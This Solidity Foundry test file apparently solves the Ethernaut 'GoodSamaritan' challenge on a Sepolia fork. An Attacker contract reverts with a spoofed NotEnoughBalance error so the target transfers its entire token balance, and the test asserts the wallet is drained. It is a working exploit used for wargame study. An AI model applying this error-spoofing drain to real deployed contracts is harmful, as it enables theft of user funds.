// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface GoodSamaritan {
    function coin() external returns(Coin coin);
    function wallet() external returns(Wallet wallet);
    function requestDonation() external returns(bool enoughBalance);
}

interface Wallet{
    function owner() external returns(address);
    function coin() external returns(address);
}

interface Coin{
    function balances(address) external returns(uint256);
}


contract Attacker {
    error NotEnoughBalance();
    GoodSamaritan instance;
    constructor(address _instance) {
        instance = GoodSamaritan(_instance);
    }
    function isContract(address addr) public returns (bool) {
        uint balance = instance.coin().balances(address(instance.wallet()));
        if(balance > 0){
            return true;
        }
        return false;
    }

    function notify(uint256 amount) external {
        uint balance = instance.coin().balances(address(instance.wallet()));
        if (balance > 0){
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        instance.requestDonation();
    }
}

contract GoodSamaritanTest is Test {

    function setUp() public{
        vm.createSelectFork("sepolia", 5502970);

    }
    function test_goodsamaritan() public{
        address instance = 0xF10B81b6a2051B1a002b94C88F9995e13407e09B;
        Coin coin = GoodSamaritan(instance).coin();
        Wallet wallet = GoodSamaritan(instance).wallet();

        Attacker attacker = new Attacker(instance);
        attacker.attack();

        require(0 == coin.balances(address(wallet)), "Wallet drained");
        require(1000000 == coin.balances(address(attacker)), "Attacker got all tokens");
    }
}
